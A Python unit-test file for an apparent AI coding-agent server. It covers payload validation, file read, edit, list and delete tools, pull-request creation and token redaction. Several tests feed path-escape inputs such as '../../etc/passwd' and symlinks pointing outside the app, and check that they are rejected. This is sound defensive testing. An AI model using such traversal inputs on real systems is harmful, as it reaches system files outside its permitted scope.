"""Unit tests for dev_agent_server.py's pure logic — payload validation, the
tool implementations that don't need a real cloned working tree end-to-end,
and the trace-scanning helpers run_job relies on. No Docker, no live
Anthropic key, no real git/GitHub calls: subprocess and network boundaries
are mocked. Run with: python3 -m unittest test_dev_agent_server -v

Deliberately NOT covering _run_coding_loop or run_job end-to-end here — that
needs a real (or thoroughly mocked) Anthropic client and checked-out working
tree, which is what run_local_sandbox.sh's live Docker run is for.
"""

from __future__ import annotations

import os
import shutil
import tempfile
import unittest
from unittest.mock import patch

import dev_agent_server as srv


def _valid_payload(**overrides):
    payload = {
        "correlation_id": "corr-1",
        "target_app": "one_bpmn",
        "git_branch": "staging",
        "work_item_description": "Fix the thing.",
        "agent_config": {"system_prompt": "You are helpful.", "model": "claude-haiku-4-5", "api_key": "sk-test"},
        "tools": [
            {"name": "read_file", "description": "Read a file.", "input_schema": {"type": "object", "properties": {}}},
        ],
        "github_token": "gh-test-token",
        "callback_url": "https://processa.example.com/api/method/one_bpmn.api.agent_callback.report_result",
    }
    payload.update(overrides)
    return payload


class TestValidatePayloadTools(unittest.TestCase):
    def test_valid_payload_passes(self):
        self.assertIsNone(srv._validate_payload(_valid_payload()))

    def test_missing_tools_field_rejected(self):
        payload = _valid_payload()
        del payload["tools"]
        self.assertIn("Missing required field", srv._validate_payload(payload))

    def test_empty_tools_list_rejected(self):
        error = srv._validate_payload(_valid_payload(tools=[]))
        self.assertIn("non-empty list", error)

    def test_tools_not_a_list_rejected(self):
        error = srv._validate_payload(_valid_payload(tools={"name": "read_file"}))
        self.assertIn("non-empty list", error)

    def test_tool_missing_required_field_rejected(self):
        error = srv._validate_payload(_valid_payload(tools=[{"name": "read_file"}]))
        self.assertIn("missing required field", error)
        self.assertIn("description", error)

    def test_unknown_tool_name_rejected(self):
        error = srv._validate_payload(_valid_payload(tools=[
            {"name": "delete_everything", "description": "x", "input_schema": {}},
        ]))
        self.assertIn("delete_everything", error)
        self.assertIn("no implementation", error)

    def test_all_known_tool_names_accepted(self):
        tools = [
            {"name": name, "description": "x", "input_schema": {"type": "object", "properties": {}}}
            for name in sorted(srv._KNOWN_TOOL_NAMES)
        ]
        self.assertIsNone(srv._validate_payload(_valid_payload(tools=tools)))


class TestReadFile(unittest.TestCase):
    def setUp(self):
        self.app_dir = os.path.realpath(tempfile.mkdtemp())
        self._write("f.py", "".join(f"line{i}\n" for i in range(1, 11)))  # 10 lines

    def tearDown(self):
        shutil.rmtree(self.app_dir, ignore_errors=True)

    def _write(self, rel_path, content):
        with open(os.path.join(self.app_dir, rel_path), "w", encoding="utf-8") as fh:
            fh.write(content)

    def test_no_offset_or_limit_returns_the_whole_file(self):
        result = srv._tool_read_file(self.app_dir, {"path": "f.py"})
        self.assertEqual(result["content"], "".join(f"line{i}\n" for i in range(1, 11)))
        self.assertNotIn("total_lines", result)

    def test_offset_and_limit_return_a_1_indexed_inclusive_slice(self):
        result = srv._tool_read_file(self.app_dir, {"path": "f.py", "offset": 3, "limit": 2})
        self.assertEqual(result["content"], "line3\nline4\n")
        self.assertEqual(result["total_lines"], 10)
        self.assertEqual(result["returned_lines"], "3-4")

    def test_offset_alone_reads_to_end_of_file(self):
        result = srv._tool_read_file(self.app_dir, {"path": "f.py", "offset": 9})
        self.assertEqual(result["content"], "line9\nline10\n")

    def test_missing_file_is_still_reported_as_not_found(self):
        result = srv._tool_read_file(self.app_dir, {"path": "nope.py", "offset": 1})
        self.assertEqual(result, {"found": False, "content": ""})


class TestEditFile(unittest.TestCase):
    def setUp(self):
        # realpath: on macOS, mkdtemp() returns a path through a symlink
        # (/var/folders/... -> /private/var/folders/...), and _safe_path
        # itself realpath()s before its prefix check — without matching that
        # here too, the two sides disagree and every call looks like an
        # escape attempt. BENCH_DIR in real use is never symlinked, so this
        # is purely a test-fixture concern, not something _safe_path itself
        # needs to guard against differently.
        self.app_dir = os.path.realpath(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.app_dir, ignore_errors=True)

    def _write(self, rel_path, content):
        abs_path = os.path.join(self.app_dir, rel_path)
        os.makedirs(os.path.dirname(abs_path) or self.app_dir, exist_ok=True)
        with open(abs_path, "w", encoding="utf-8") as fh:
            fh.write(content)

    def _read(self, rel_path):
        with open(os.path.join(self.app_dir, rel_path), encoding="utf-8") as fh:
            return fh.read()

    def test_replaces_a_unique_match(self):
        self._write("foo.py", "def foo():\n    return 1\n")
        result = srv._tool_edit_file(self.app_dir, {
            "path": "foo.py", "old_string": "return 1", "new_string": "return 2",
        })
        self.assertEqual(result, {"edited": True, "path": "foo.py"})
        self.assertEqual(self._read("foo.py"), "def foo():\n    return 2\n")

    def test_zero_matches_is_an_error_not_a_silent_noop(self):
        self._write("foo.py", "def foo():\n    return 1\n")
        result = srv._tool_edit_file(self.app_dir, {
            "path": "foo.py", "old_string": "return 999", "new_string": "return 2",
        })
        self.assertIn("error", result)
        self.assertEqual(self._read("foo.py"), "def foo():\n    return 1\n")  # untouched

    def test_a_miss_returns_the_current_text_around_the_closest_line(self):
        self._write("foo.py", "import os\n\n\ndef foo():\n    return 1\n\n\nx = 2\n")
        result = srv._tool_edit_file(self.app_dir, {
            "path": "foo.py", "old_string": "def foo():\n    return 3\n", "new_string": "def foo():\n    return 4\n",
        })
        self.assertIn("error", result)
        self.assertEqual(result["current_lines"], "1-8")
        self.assertIn("    return 1\n", result["current_text"])

    def test_a_miss_with_nothing_close_returns_only_the_error(self):
        self._write("foo.py", "def foo():\n    return 1\n")
        result = srv._tool_edit_file(self.app_dir, {
            "path": "foo.py", "old_string": "class Unrelated(Base):", "new_string": "x",
        })
        self.assertIn("error", result)
        self.assertNotIn("current_text", result)

    def test_ambiguous_match_is_rejected(self):
        self._write("foo.py", "x = 1\nx = 1\n")
        result = srv._tool_edit_file(self.app_dir, {
            "path": "foo.py", "old_string": "x = 1", "new_string": "x = 2",
        })
        self.assertIn("error", result)
        self.assertIn("2 times", result["error"])
        self.assertEqual(self._read("foo.py"), "x = 1\nx = 1\n")  # untouched

    def test_missing_file_is_an_error(self):
        result = srv._tool_edit_file(self.app_dir, {
            "path": "nope.py", "old_string": "a", "new_string": "b",
        })
        self.assertIn("error", result)

    def test_path_escape_is_rejected(self):
        result = srv._tool_edit_file(self.app_dir, {
            "path": "../../etc/passwd", "old_string": "a", "new_string": "b",
        })
        self.assertIn("error", result)


class TestListFiles(unittest.TestCase):
    """Confirmed live (2026-09-06): a 500-file cap silently truncated a real
    listing (one_bpmn alone has 738 files), and the model never acted on the
    truncated flag it was given — it just kept guessing narrower
    path_prefix values for a file that (separately) turned out not to
    exist, and burned its whole turn budget without ever finishing. The cap
    itself is still real (a pathological repo must not return an unbounded
    response) — these tests fix the boundary at a small, testable size."""

    def setUp(self):
        self.app_dir = os.path.realpath(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.app_dir, ignore_errors=True)

    def _make_files(self, count):
        for i in range(count):
            path = os.path.join(self.app_dir, f"file_{i:04d}.txt")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write("x")

    def test_under_the_cap_is_not_truncated(self):
        self._make_files(5)
        with patch.object(srv, "_LIST_FILES_MAX", 10):
            result = srv._tool_list_files(self.app_dir, {})
        self.assertEqual(result["count"], 5)
        self.assertFalse(result["truncated"])
        self.assertEqual(len(result["files"]), 5)

    def test_over_the_cap_is_truncated_at_exactly_the_cap(self):
        self._make_files(15)
        with patch.object(srv, "_LIST_FILES_MAX", 10):
            result = srv._tool_list_files(self.app_dir, {})
        self.assertEqual(result["count"], 10)
        self.assertTrue(result["truncated"])
        self.assertEqual(len(result["files"]), 10)

    def test_default_cap_covers_a_realistic_target_app(self):
        """The real one_bpmn app alone has 738 files under its own tree
        (confirmed live) — the default cap must clear that with headroom,
        not just the boundary this test asserts."""
        self.assertGreater(srv._LIST_FILES_MAX, 738)

    def test_a_size_cap_truncates_before_the_count_cap_does(self):
        """Confirmed live (2026-09-07): an unscoped call on a real app returned
        a ~277KB listing well under the 5000-file count cap — one call alone
        accounted for the bulk of a run's token usage, resent on every later
        turn. Long paths must trip a size limit before the count ever does."""
        self._make_files(50)  # ~14 chars each ≈ 700 chars total — count cap (10) won't fire
        with patch.object(srv, "_LIST_FILES_MAX", 1000), patch.object(srv, "_LIST_FILES_MAX_CHARS", 100):
            result = srv._tool_list_files(self.app_dir, {})
        self.assertTrue(result["truncated"])
        self.assertLess(result["count"], 50)

    def test_under_both_caps_is_not_truncated(self):
        self._make_files(5)
        with patch.object(srv, "_LIST_FILES_MAX", 1000), patch.object(srv, "_LIST_FILES_MAX_CHARS", 100_000):
            result = srv._tool_list_files(self.app_dir, {})
        self.assertFalse(result["truncated"])
        self.assertEqual(result["count"], 5)

    def test_default_size_cap_is_well_under_the_277kb_seen_live(self):
        self.assertLess(srv._LIST_FILES_MAX_CHARS, 277_000)

    def test_every_file_comes_with_its_line_count(self):
        with open(os.path.join(self.app_dir, "three.py"), "w", encoding="utf-8") as fh:
            fh.write("a\nb\nc")
        with open(os.path.join(self.app_dir, "ends_in_newline.js"), "w", encoding="utf-8") as fh:
            fh.write("a\nb\n")
        result = srv._tool_list_files(self.app_dir, {})
        self.assertEqual(result["line_counts"], {"three.py": 3, "ends_in_newline.js": 3})
        self.assertEqual(sorted(result["files"]), sorted(result["line_counts"]))

    def test_a_binary_or_broken_file_has_no_line_count(self):
        with open(os.path.join(self.app_dir, "logo.png"), "wb") as fh:
            fh.write(b"\x89PNG\0\0\n")
        os.symlink(os.path.join(self.app_dir, "missing"), os.path.join(self.app_dir, "broken"))
        result = srv._tool_list_files(self.app_dir, {})
        self.assertEqual(result["line_counts"], {"logo.png": None, "broken": None})

    def test_a_symlink_out_of_the_app_is_not_opened(self):
        outside = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
        outside.write("secret\nsecret\n")
        outside.close()
        self.addCleanup(os.unlink, outside.name)
        os.symlink(outside.name, os.path.join(self.app_dir, "escape.txt"))
        with patch("builtins.open", wraps=open) as opened:
            result = srv._tool_list_files(self.app_dir, {})
        self.assertIsNone(result["line_counts"]["escape.txt"])
        self.assertNotIn(os.path.realpath(outside.name), [os.path.realpath(c.args[0]) for c in opened.call_args_list])


class TestDispatchToolRouting(unittest.TestCase):
    def setUp(self):
        self.app_dir = tempfile.mkdtemp()
        self.run_ctx = {
            "git_branch": "staging", "work_item_description": "Fix it.",
            "github_token": "gh-token", "correlation_id": "corr-1",
        }

    def tearDown(self):
        shutil.rmtree(self.app_dir, ignore_errors=True)

    def test_unknown_tool_name_returns_a_structured_error_not_a_crash(self):
        result = srv._dispatch_tool(self.app_dir, "one_bpmn", "not_a_real_tool", {}, self.run_ctx)
        self.assertIn("error", result)
        self.assertIn("not_a_real_tool", result["error"])

    def test_open_pull_request_routes_to_the_new_handler(self):
        with patch.object(srv, "_tool_open_pull_request", return_value={"pr_url": "https://x"}) as mock_fn:
            result = srv._dispatch_tool(self.app_dir, "one_bpmn", "open_pull_request", {"summary": "did stuff"}, self.run_ctx)
        mock_fn.assert_called_once_with("one_bpmn", {"summary": "did stuff"}, self.run_ctx)
        self.assertEqual(result, {"pr_url": "https://x"})

    def test_edit_file_routes_to_the_new_handler(self):
        with patch.object(srv, "_tool_edit_file", return_value={"edited": True}) as mock_fn:
            args = {"path": "a.py", "old_string": "x", "new_string": "y"}
            result = srv._dispatch_tool(self.app_dir, "one_bpmn", "edit_file", args, self.run_ctx)
        mock_fn.assert_called_once_with(self.app_dir, args)
        self.assertEqual(result, {"edited": True})


class TestOpenPullRequestTool(unittest.TestCase):
    def setUp(self):
        self.run_ctx = {
            "git_branch": "staging", "work_item_description": "Fix it.",
            "github_token": "gh-token", "correlation_id": "corr-1",
        }

    def test_no_changes_is_an_error_before_anything_else_runs(self):
        with patch.object(srv, "_collect_changed_files", return_value={}), patch.object(
            srv, "_run_tests"
        ) as mock_run_tests, patch.object(srv, "_open_pr") as mock_open_pr:
            result = srv._tool_open_pull_request("one_bpmn", {"summary": "nothing"}, self.run_ctx)
        self.assertIn("error", result)
        mock_run_tests.assert_not_called()
        mock_open_pr.assert_not_called()

    def test_reruns_tests_fresh_rather_than_trusting_a_stale_prior_result(self):
        """The whole point of re-testing inside this tool: the model may have
        edited files after its last run_tests call, so pass/fail here must
        come from a fresh run, not whatever the model last saw."""
        with patch.object(srv, "_collect_changed_files", return_value={"a.py": "content"}), patch.object(
            srv, "_run_tests", return_value=(True, "out", "err", [])
        ) as mock_run_tests, patch.object(
            srv, "_open_pr", return_value=("https://github.com/x/y/pull/1", None)
        ) as mock_open_pr:
            result = srv._tool_open_pull_request("one_bpmn", {"summary": "did stuff"}, self.run_ctx)
        mock_run_tests.assert_called_once_with("one_bpmn")
        self.assertEqual(
            result, {"pr_url": "https://github.com/x/y/pull/1", "tests_passed": True, "failing_tests": []}
        )
        args, kwargs = mock_open_pr.call_args
        self.assertEqual(args[0], "one_bpmn")
        self.assertEqual(args[1], "staging")
        self.assertIs(kwargs["tests_passed"], True)
        self.assertEqual(kwargs["stderr_tail"], "err")

    def test_pr_error_surfaces_with_test_status_attached(self):
        with patch.object(srv, "_collect_changed_files", return_value={"a.py": "content"}), patch.object(
            srv, "_run_tests", return_value=(False, "out", "boom", ["test_thing (module.TestCase)"])
        ), patch.object(srv, "_open_pr", return_value=(None, "GitHub API error (500)")):
            result = srv._tool_open_pull_request("one_bpmn", {"summary": "did stuff"}, self.run_ctx)
        self.assertEqual(
            result,
            {
                "error": "GitHub API error (500)", "tests_passed": False,
                "failing_tests": ["test_thing (module.TestCase)"],
            },
        )


class TestDeletedFilesReachThePr(unittest.TestCase):
    """A file removed with delete_file used to be dropped from the changed files, so a delete-only change opened no PR."""

    def _repo_with_deleted_file(self):
        bench = os.path.realpath(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, bench, True)
        app_dir = os.path.join(bench, "apps", "one_bpmn")
        os.makedirs(app_dir)

        def run(cmd):
            return srv._run(f"cd {app_dir} && {cmd}")

        run("git init -q -b staging && git -c user.email=t@t -c user.name=t commit -q --allow-empty -m init")
        with open(os.path.join(app_dir, "old.vue"), "w") as fh:
            fh.write("x")
        run("git add old.vue && git -c user.email=t@t -c user.name=t commit -q -m add && git checkout -q -b work")
        srv._tool_delete_file(app_dir, {"path": "old.vue"})
        run("git add -- old.vue && git -c user.email=t@t -c user.name=t commit -q -m delete")
        return bench

    def test_a_committed_deletion_is_a_changed_file(self):
        bench = self._repo_with_deleted_file()
        with patch.object(srv, "BENCH_DIR", bench):
            self.assertEqual(srv._collect_changed_files("one_bpmn", "staging"), {"old.vue": None})

    def test_a_delete_only_change_opens_a_pr(self):
        bench = self._repo_with_deleted_file()
        run_ctx = {"git_branch": "staging", "work_item_description": "Remove old.vue.", "github_token": "t", "correlation_id": "c"}
        with patch.object(srv, "BENCH_DIR", bench), patch.object(
            srv, "_run_tests", return_value=(True, "", "", [])
        ), patch.object(srv, "_open_pr", return_value=("https://github.com/x/y/pull/2", None)) as mock_open_pr:
            result = srv._tool_open_pull_request("one_bpmn", {"summary": "removed"}, run_ctx)
        self.assertEqual(result["pr_url"], "https://github.com/x/y/pull/2")
        self.assertEqual(mock_open_pr.call_args[0][3], {"old.vue": None})

    def test_open_pr_deletes_the_file_on_the_pr_branch(self):
        calls = []

        def fake_github(method, url, token, ok=(200, 201), json_body=None):
            calls.append((method, url, json_body))
            if method == "GET" and "/git/ref/" in url:
                return {"object": {"sha": "base"}}
            if method == "GET" and "/contents/old.vue" in url:
                return {"sha": "abc"}
            if method == "POST" and url.endswith("/pulls"):
                return {"html_url": "https://github.com/x/y/pull/3", "number": 3}
            return {}

        with patch.object(srv, "_repo_for_local_clone", return_value="x/y"), patch.object(
            srv, "_github_request", side_effect=fake_github
        ):
            pr_url, err = srv._open_pr("one_bpmn", "staging", "Remove old.vue.", {"old.vue": None}, "t", "c", "removed")
        self.assertEqual((pr_url, err), ("https://github.com/x/y/pull/3", None))
        deletes = [c for c in calls if c[0] == "DELETE"]
        self.assertEqual(len(deletes), 1)
        self.assertTrue(deletes[0][1].endswith("/contents/old.vue"))
        self.assertEqual(deletes[0][2]["sha"], "abc")
        self.assertFalse([c for c in calls if c[0] == "PUT" and "/contents/" in c[1]])
        pr_body = next(c[2]["body"] for c in calls if c[0] == "POST" and c[1].endswith("/pulls"))
        self.assertIn("`old.vue` (deleted)", pr_body)


class TestLastOpenPrResult(unittest.TestCase):
    def test_no_trace_entries_returns_none(self):
        self.assertIsNone(srv._last_open_pr_result([]))

    def test_no_open_pull_request_calls_returns_none(self):
        trace = [{"role": "assistant", "content": "", "tool_calls": [
            {"name": "read_file", "arguments": {}, "result": {}, "status": "Success"},
        ]}]
        self.assertIsNone(srv._last_open_pr_result(trace))

    def test_returns_the_last_call_when_called_more_than_once(self):
        trace = [
            {"role": "assistant", "content": "", "tool_calls": [
                {"name": "open_pull_request", "arguments": {}, "result": {"error": "no changes"}, "status": "Error"},
            ]},
            {"role": "assistant", "content": "", "tool_calls": [
                {"name": "write_file", "arguments": {}, "result": {}, "status": "Success"},
            ]},
            {"role": "assistant", "content": "", "tool_calls": [
                {"name": "open_pull_request", "arguments": {}, "result": {"pr_url": "https://x"}, "status": "Success"},
            ]},
        ]
        self.assertEqual(srv._last_open_pr_result(trace), {"pr_url": "https://x"})


class TestHeadBranchFor(unittest.TestCase):
    def test_deterministic_across_calls(self):
        a = srv._head_branch_for("one_bpmn", "staging", "Fix the thing.")
        b = srv._head_branch_for("one_bpmn", "staging", "Fix the thing.")
        self.assertEqual(a, b)
        self.assertTrue(a.startswith("dev-agent/"))

    def test_differs_when_any_input_differs(self):
        base = srv._head_branch_for("one_bpmn", "staging", "Fix the thing.")
        self.assertNotEqual(base, srv._head_branch_for("one_fm", "staging", "Fix the thing."))
        self.assertNotEqual(base, srv._head_branch_for("one_bpmn", "main", "Fix the thing."))
        self.assertNotEqual(base, srv._head_branch_for("one_bpmn", "staging", "Fix another thing."))


class _FakeCompletedProcess:
    def __init__(self, returncode=0, stdout="", stderr=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


class TestCheckoutOrCreateHeadBranch(unittest.TestCase):
    def test_head_branch_already_exists_remotely(self):
        calls = []

        def fake_run(cmd, **kwargs):
            calls.append(cmd)
            if "git remote get-url origin" in cmd:
                return _FakeCompletedProcess(0, stdout="https://github.com/o/r.git\n")
            if f"git fetch origin dev-agent/abc" in cmd:
                return _FakeCompletedProcess(0)
            if "git checkout dev-agent/abc" in cmd:
                return _FakeCompletedProcess(0)
            return _FakeCompletedProcess(0)

        with patch.object(srv, "_run", side_effect=fake_run):
            ok, err = srv._checkout_or_create_head_branch("one_bpmn", "staging", "dev-agent/abc")
        self.assertTrue(ok)
        self.assertIsNone(err)
        # Never fell through to creating/pushing a new branch off the base.
        self.assertFalse(any("git push" in c for c in calls))

    def test_head_branch_missing_creates_and_pushes(self):
        calls = []

        def fake_run(cmd, **kwargs):
            calls.append(cmd)
            if "git remote get-url origin" in cmd:
                return _FakeCompletedProcess(0, stdout="https://github.com/o/r.git\n")
            if "git fetch origin dev-agent/abc" in cmd:
                return _FakeCompletedProcess(1, stderr="couldn't find remote ref")
            return _FakeCompletedProcess(0)

        with patch.object(srv, "_run", side_effect=fake_run):
            ok, err = srv._checkout_or_create_head_branch("one_bpmn", "staging", "dev-agent/abc")
        self.assertTrue(ok)
        self.assertIsNone(err)
        self.assertTrue(any("git checkout -B dev-agent/abc" in c for c in calls))
        self.assertTrue(any("git push -u origin dev-agent/abc" in c for c in calls))

    def test_base_branch_fetch_failure_is_reported(self):
        def fake_run(cmd, **kwargs):
            if "git remote get-url origin" in cmd:
                return _FakeCompletedProcess(0, stdout="https://github.com/o/r.git\n")
            if "git fetch origin dev-agent/abc" in cmd:
                return _FakeCompletedProcess(1, stderr="no such ref")
            if "git fetch origin staging" in cmd:
                return _FakeCompletedProcess(1, stderr="network error")
            return _FakeCompletedProcess(0)

        with patch.object(srv, "_run", side_effect=fake_run):
            ok, err = srv._checkout_or_create_head_branch("one_bpmn", "staging", "dev-agent/abc")
        self.assertFalse(ok)
        self.assertIn("network error", err)

    def test_github_token_never_appears_in_a_reported_error(self):
        # Both fetches fail (a total auth failure, not just "branch doesn't
        # exist yet") so the function actually returns an error to check —
        # a fetch_head failure alone falls through to the base-branch path,
        # same as a genuine "branch not created yet" case would.
        with patch.dict(os.environ, {"GITHUB_TOKEN": "super-secret-token"}):
            def fake_run(cmd, **kwargs):
                if "git remote get-url origin" in cmd:
                    return _FakeCompletedProcess(0, stdout="https://github.com/o/r.git\n")
                if "git fetch origin dev-agent/abc" in cmd:
                    return _FakeCompletedProcess(1, stderr="fatal: could not read from super-secret-token@github.com")
                if "git fetch origin staging" in cmd:
                    return _FakeCompletedProcess(1, stderr="fatal: could not read from super-secret-token@github.com")
                return _FakeCompletedProcess(0)

            with patch.object(srv, "_run", side_effect=fake_run):
                ok, err = srv._checkout_or_create_head_branch("one_bpmn", "staging", "dev-agent/abc")
        self.assertFalse(ok)
        self.assertNotIn("super-secret-token", err)
        self.assertIn("***", err)


class TestValidateToolCallPayload(unittest.TestCase):
    def _payload(self, **overrides):
        payload = {
            "action": "read_file",
            "target_app": "one_bpmn",
            "git_branch": "staging",
            "work_item_description": "Fix the thing.",
            "github_token": "gh-token",
            "args": {"path": "a.py"},
        }
        payload.update(overrides)
        return payload

    def test_valid_payload_passes(self):
        self.assertIsNone(srv._validate_tool_call_payload(self._payload()))

    def test_missing_field_rejected(self):
        payload = self._payload()
        del payload["target_app"]
        self.assertIn("target_app", srv._validate_tool_call_payload(payload))

    def test_slow_action_rejected_here(self):
        error = srv._validate_tool_call_payload(self._payload(action="run_tests"))
        self.assertIn("run_tests", error)
        self.assertIn("not valid for /tool_call", error)

    def test_args_must_be_an_object(self):
        error = srv._validate_tool_call_payload(self._payload(args="not-a-dict"))
        self.assertIn("args must be an object", error)


class TestValidatePayloadActionBranch(unittest.TestCase):
    def _action_payload(self, **overrides):
        payload = {
            "correlation_id": "corr-1",
            "action": "run_tests",
            "target_app": "one_bpmn",
            "git_branch": "staging",
            "work_item_description": "Fix the thing.",
            "github_token": "gh-token",
            "callback_url": "https://processa.example.com/api/method/one_bpmn.api.agent_callback.report_result",
        }
        payload.update(overrides)
        return payload

    def test_valid_action_payload_passes(self):
        self.assertIsNone(srv._validate_payload(self._action_payload()))
        self.assertIsNone(srv._validate_payload(self._action_payload(action="open_pull_request")))

    def test_fast_action_rejected_on_run(self):
        error = srv._validate_payload(self._action_payload(action="read_file"))
        self.assertIn("not valid for /run", error)

    def test_missing_field_rejected(self):
        payload = self._action_payload()
        del payload["github_token"]
        self.assertIn("github_token", srv._validate_payload(payload))

    def test_does_not_require_agent_config_or_tools(self):
        payload = self._action_payload()
        self.assertNotIn("agent_config", payload)
        self.assertNotIn("tools", payload)
        self.assertIsNone(srv._validate_payload(payload))


class TestHandleToolCall(unittest.TestCase):
    def setUp(self):
        # A fresh BENCH_DIR per test (not a shared /tmp root) with a real
        # apps/one_bpmn directory — no symlink needed, and no risk of one
        # test's directory colliding with another's.
        self.bench_dir = os.path.realpath(tempfile.mkdtemp())
        self.app_dir = os.path.join(self.bench_dir, "apps", "one_bpmn")
        os.makedirs(self.app_dir)
        self.bench_dir_patch = patch.object(srv, "BENCH_DIR", self.bench_dir)
        self.bench_dir_patch.start()

    def tearDown(self):
        self.bench_dir_patch.stop()
        shutil.rmtree(self.bench_dir, ignore_errors=True)

    def _payload(self, action, args):
        return {
            "action": action, "target_app": "one_bpmn", "git_branch": "staging",
            "work_item_description": "Fix the thing.", "args": args, "github_token": "gh-token",
        }

    def test_checkout_failure_short_circuits_before_touching_files(self):
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(False, "branch trouble")):
            result = srv._handle_tool_call(self._payload("read_file", {"path": "a.py"}))
        self.assertEqual(result, {"error": "branch trouble"})

    def test_read_file_after_successful_checkout(self):
        with open(os.path.join(self.app_dir, "a.py"), "w") as fh:
            fh.write("hello")
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(True, None)):
            result = srv._handle_tool_call(self._payload("read_file", {"path": "a.py"}))
        self.assertEqual(result, {"found": True, "content": "hello"})

    def test_write_file_commits_and_pushes_on_success(self):
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(True, None)), patch.object(
            srv, "_commit_and_push", return_value=(True, None)
        ) as mock_commit:
            result = srv._handle_tool_call(self._payload("write_file", {"path": "a.py", "content": "x"}))
        self.assertEqual(result, {"written": True, "path": "a.py"})
        mock_commit.assert_called_once()

    def test_a_bench_path_from_search_frontend_reads_the_app_file(self):
        os.makedirs(os.path.join(self.app_dir, "spiff", "src"))
        with open(os.path.join(self.app_dir, "spiff", "src", "a.vue"), "w") as fh:
            fh.write("hello")
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(True, None)):
            result = srv._handle_tool_call(self._payload("read_file", {"path": "one_bpmn/spiff/src/a.vue"}))
        self.assertTrue(result["found"])
        self.assertIn("hello", result["content"])

    def test_a_path_inside_the_apps_own_package_is_left_alone(self):
        os.makedirs(os.path.join(self.app_dir, "one_bpmn", "api"))
        os.makedirs(os.path.join(self.app_dir, "api"))
        with open(os.path.join(self.app_dir, "one_bpmn", "api", "x.py"), "w") as fh:
            fh.write("package")
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(True, None)):
            result = srv._handle_tool_call(self._payload("read_file", {"path": "one_bpmn/api/x.py"}))
        self.assertIn("package", result["content"])

    def test_bench_paths_reach_delete_and_list_with_the_app_path(self):
        os.makedirs(os.path.join(self.app_dir, "spiff", "src"))
        with open(os.path.join(self.app_dir, "spiff", "src", "old.vue"), "w") as fh:
            fh.write("x")
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(True, None)), patch.object(
            srv, "_commit_and_push", return_value=(True, None)
        ) as mock_commit:
            listed = srv._handle_tool_call(self._payload("list_files", {"path_prefix": "one_bpmn/spiff"}))
            deleted = srv._handle_tool_call(self._payload("delete_file", {"path": "one_bpmn/spiff/src/old.vue"}))
        self.assertEqual(listed["files"], ["spiff/src/old.vue"])
        self.assertEqual(deleted, {"deleted": True, "path": "spiff/src/old.vue"})
        self.assertEqual(mock_commit.call_args[0][2], "spiff/src/old.vue")

    def test_write_file_surfaces_a_commit_error_without_failing_the_write(self):
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(True, None)), patch.object(
            srv, "_commit_and_push", return_value=(False, "push rejected")
        ):
            result = srv._handle_tool_call(self._payload("write_file", {"path": "a.py", "content": "x"}))
        self.assertTrue(result["written"])
        self.assertEqual(result["commit_error"], "push rejected")

    def test_unknown_action_is_a_structured_error(self):
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(True, None)):
            result = srv._handle_tool_call(self._payload("delete_everything", {}))
        self.assertIn("error", result)

    def test_delete_file_removes_the_file_and_commits_the_deletion(self):
        target = os.path.join(self.app_dir, "old.vue")
        with open(target, "w") as fh:
            fh.write("<template/>")
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(True, None)), patch.object(
            srv, "_commit_and_push", return_value=(True, None)
        ) as mock_commit:
            result = srv._handle_tool_call(self._payload("delete_file", {"path": "old.vue"}))
        self.assertEqual(result, {"deleted": True, "path": "old.vue"})
        self.assertFalse(os.path.exists(target))
        self.assertEqual(mock_commit.call_args.args[2], "old.vue")
        self.assertIn("delete_file via", mock_commit.call_args.args[3])

    def test_delete_file_refuses_a_directory_a_missing_file_and_a_path_out_of_the_app(self):
        os.makedirs(os.path.join(self.app_dir, "spiff"))
        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(True, None)), patch.object(
            srv, "_commit_and_push", return_value=(True, None)
        ) as mock_commit:
            for path in ("spiff", "missing.vue", "../outside.txt"):
                self.assertIn("error", srv._handle_tool_call(self._payload("delete_file", {"path": path})))
        self.assertTrue(os.path.isdir(os.path.join(self.app_dir, "spiff")))
        mock_commit.assert_not_called()

    def test_git_add_on_a_deleted_path_stages_the_deletion(self):
        """_commit_and_push runs `git add -- <path>`; for a removed file that must record the removal."""
        repo = os.path.realpath(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, repo, True)

        def run(cmd):
            return srv._run(f"cd {repo} && {cmd}")

        run("git init -q && git -c user.email=t@t -c user.name=t commit -q --allow-empty -m init")
        with open(os.path.join(repo, "old.vue"), "w") as fh:
            fh.write("x")
        run("git add old.vue && git -c user.email=t@t -c user.name=t commit -q -m add")
        self.assertTrue(srv._tool_delete_file(repo, {"path": "old.vue"})["deleted"])
        run("git add -- old.vue && git -c user.email=t@t -c user.name=t commit -q -m delete")
        self.assertEqual(run("git ls-files old.vue").stdout.strip(), "")
        self.assertIn("D\told.vue", run("git show --name-status --format= HEAD").stdout)


if __name__ == "__main__":
    unittest.main()


class TestHeadBranchForWorkItemId(unittest.TestCase):
    def test_work_item_id_becomes_the_branch(self):
        self.assertEqual(srv._head_branch_for("one_bpmn", "staging", "Fix the thing.", "WI-002322"), "WI-002322")

    def test_same_work_item_converges_regardless_of_description(self):
        a = srv._head_branch_for("one_bpmn", "staging", "Fix the thing.", "WI-002322")
        b = srv._head_branch_for("one_bpmn", "staging", "Fix the thing, reworded.", "WI-002322")
        self.assertEqual(a, b)

    def test_unsafe_characters_are_sanitised_not_rejected(self):
        self.assertEqual(srv._head_branch_for("a", "b", "c", " WI 002322 (rev 2)~ "), "WI-002322-rev-2")

    def test_blank_or_unusable_id_falls_back_to_the_hash(self):
        hashed = srv._head_branch_for("one_bpmn", "staging", "Fix the thing.")
        for unusable in ("", None, "~~~", " / "):
            self.assertEqual(srv._head_branch_for("one_bpmn", "staging", "Fix the thing.", unusable), hashed)


class TestWorkItemIdThreading(unittest.TestCase):
